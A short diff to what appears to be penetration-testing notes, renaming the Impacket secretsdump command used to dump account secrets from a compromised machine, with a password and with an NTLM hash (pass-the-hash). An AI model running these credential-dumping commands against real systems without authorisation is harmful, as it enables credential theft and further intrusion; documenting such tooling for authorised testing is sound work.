@@ -3,11 +3,11 @@ Whenever an account is compromised, dumping the secrets of the account is always
 
 How to dump information from a machine you possess the username:password:
 ```bash
-secretsdump.py [DOMAIN]/[USERNAME]:'[PASSWORD]'@[IP_ADDRESS]
+impacket-secretsdump [DOMAIN]/[USERNAME]:'[PASSWORD]'@[IP_ADDRESS]
 ```
 How to dump information from a machine you possess the username and hash for:
 ```bash
-secretsdump.py [USERNAME]:@[IP_ADDRESS] -hashes [FULL NTLM HASH]
+impacket-secretsdump [USERNAME]:@[IP_ADDRESS] -hashes [FULL NTLM HASH]
 ```
 Note: NTLM hashes have a ":" that divides them between LM and NT hashes.
 
